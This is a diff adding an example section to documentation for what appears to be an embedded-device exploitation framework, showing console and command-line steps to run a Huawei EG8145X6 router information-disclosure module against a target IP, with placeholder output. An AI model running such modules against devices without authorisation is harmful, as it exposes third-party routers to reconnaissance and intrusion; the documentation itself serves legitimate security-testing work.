@@ -39,6 +39,39 @@ PNG gallery. Mermaid sources: [../../diagrams/architecture/README.md](../../diag
 | [11-troubleshooting.md](11-troubleshooting.md) | Common failures and fixes |
 | [Module path index (all locales)](../ANEXO-INDICE-MODULOS.md) | Full module path list |
 
+## End-to-End Example (input and expected output)
+
+Input:
+
+```text
+exf > use exploits/routers/huawei/eg8145x6_info_disclosure
+exf (EG8145X6 Info Disclosure) > set target 192.168.18.1
+exf (EG8145X6 Info Disclosure) > check
+exf (EG8145X6 Info Disclosure) > run
+```
+
+Expected output (example):
+
+```text
+[+] Target appears vulnerable
+[*] Collecting metadata...
+[+] ProductName: EG8145X6-10
+[+] APPVersion: ...
+```
+
+Automation mode input:
+
+```bash
+python -m embedxpl -m exploits/routers/huawei/eg8145x6_info_disclosure -s target 192.168.18.1 -s port 80
+```
+
+Expected output (example):
+
+```text
+[*] Running module: exploits/routers/huawei/eg8145x6_info_disclosure
+[+] ...
+```
+
 ## See also
 
 - [README.md](../../../README.md)
